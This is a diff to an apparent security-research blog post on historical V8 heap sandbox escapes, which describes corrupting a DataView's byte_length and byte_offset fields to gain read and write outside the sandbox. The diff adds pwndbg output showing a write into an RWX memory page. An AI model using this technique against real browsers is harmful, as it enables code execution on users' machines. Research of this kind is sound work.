@@ -2,7 +2,7 @@
 tags = ["browser","v8","chromium"]
 categories = ["Web Browsers", "Javascript Engines", "Chromium"]
 description = "Corruption of the DataView object's `byte_length` and `byte_offset` fields results in arbitrary read and write primitives external to the heap sandbox."
-date = "2023-01-20"
+date = "2023-04-08"
 featuredpath = "date"
 linktitle = ""
 title = "Exploring Historical V8 Heap Sandbox Escapes II"
@@ -63,6 +63,21 @@ let view = new DataView(buf);
 %DebugPrint(view);
 %SystemBreak();
 %DebugPrint(view);
+```
+
+```
+ ► 0x5612b7a4a0c3 <Builtins_DataViewPrototypeSetBigUint64+1027>    mov    byte ptr [r8 + rdx], cl
+```
+
+```
+pwndbg> vmmap -wx
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+             Start                End Perm     Size Offset File
+     0xc34e5816000      0xc34e5817000 rwxp     1000 0      [anon_c34e5816]
+pwndbg> p/x $r8 + $rdx
+$1 = 0xc34e5816000
+pwndbg> p/x $cl
+$2 = 0xef
 ```
 
 
